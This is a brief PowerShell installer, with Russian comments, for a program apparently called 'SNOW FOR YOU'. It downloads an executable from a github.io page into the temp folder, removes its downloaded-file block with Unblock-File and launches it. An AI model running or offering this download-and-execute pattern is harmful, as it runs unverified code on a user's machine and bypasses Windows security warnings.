# SNOW FOR YOU — установка. Сайт: https://payx11.github.io/snow/
[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
$f = Join-Path $env:TEMP 'SnowForYou.exe'
Invoke-WebRequest 'https://payx11.github.io/snow/SnowForYou.exe' -OutFile $f -UseBasicParsing
Unblock-File $f
Start-Process $f
Write-Host 'Готово! SNOW FOR YOU установлен — ярлык на рабочем столе ❄' -ForegroundColor Green
